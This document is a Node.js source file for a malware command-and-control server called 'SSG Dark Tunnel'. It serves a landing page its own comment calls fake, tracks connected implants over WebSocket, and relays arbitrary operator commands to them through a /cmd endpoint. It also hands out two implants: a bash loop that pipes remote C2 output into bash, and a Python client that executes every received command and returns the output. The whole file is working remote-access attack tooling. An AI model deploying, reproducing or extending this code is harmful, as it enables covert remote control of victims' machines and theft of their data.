const express = require('express');
const WebSocket = require('ws');
const app = express();
const port = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public'));

const activeTunnels = {};
const logs = [];

function log(msg) {
    const timestamp = new Date().toISOString();
    logs.push(`[${timestamp}] ${msg}`);
    console.log(msg);
    if (logs.length > 100) logs.shift();
}

// Fake landing page
app.get('/', (req, res) => res.sendFile(__dirname + '/public/index.html'));

// API Endpoints
app.get('/ping', (req, res) => res.send('pong'));
app.get('/status', (req, res) => res.json({status: 'ready', tunnels: Object.keys(activeTunnels).length}));
app.get('/logs', (req, res) => res.send(logs.slice(-20).join('\n')));
app.get('/tunnels', (req, res) => res.json(activeTunnels));

app.post('/cmd', express.json(), (req, res) => {
    const {payload} = req.body;
    const tunnelId = Object.keys(activeTunnels)[0]; // First active tunnel
    if (tunnelId && activeTunnels[tunnelId].ws.readyState === WebSocket.OPEN) {
        activeTunnels[tunnelId].ws.send(JSON.stringify({type: 'cmd', payload}));
        res.json({status: 'sent', tunnel: tunnelId});
    } else {
        res.status(404).json({error: 'No active tunnels'});
    }
});

// Implant downloads
app.get('/implant.sh', (req, res) => {
    res.type('text/plain').send(`
#!/bin/bash
C2="wss://ssg-27mx.onrender.com/ws"
while true; do
  curl -sN -H "User-Agent: Mozilla/5.0" $C2/shell | bash 2>/dev/null || sleep $((RANDOM%60+30))
done
    `);
});

app.get('/dark_tunnel.py', (req, res) => {
    res.type('text/plain').send(String.raw`
#!/usr/bin/env python3
import websocket, json, subprocess, time, random
C2 = "wss://ssg-27mx.onrender.com/ws"
def on_message(ws, msg): 
    cmd = json.loads(msg)['payload']
    ws.send(json.dumps({"output": subprocess.getoutput(cmd)}))
ws = websocket.WebSocketApp(C2, on_message=on_message)
while True: ws.run_forever(); time.sleep(random.randint(30,90))
    `);
});

// WebSocket
const wss = new WebSocket.Server({ noServer: true });
wss.on('connection', (ws) => {
    const tunnelId = Date.now().toString();
    activeTunnels[tunnelId] = {ws, connected: new Date()};
    log(`🐙 Tunnel ${tunnelId.slice(-6)} connected: ${Object.keys(activeTunnels).length} active`);
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            log(`CMD → ${msg.payload?.slice(0,50)}`);
            if (msg.output) log(`OUT ← ${msg.output.slice(0,100)}`);
        } catch(e) {}
    });
    
    ws.on('close', () => {
        delete activeTunnels[tunnelId];
        log(`💥 Tunnel ${tunnelId.slice(-6)} disconnected`);
    });
});

const server = app.listen(port, '::', () => {
    log(`🌐 SSG Dark Tunnel live on [::]:${port}`);
});

server.on('upgrade', (request, socket, head) => {
    wss.handleUpgrade(request, socket, head, (ws) => wss.emit('connection', ws));
});
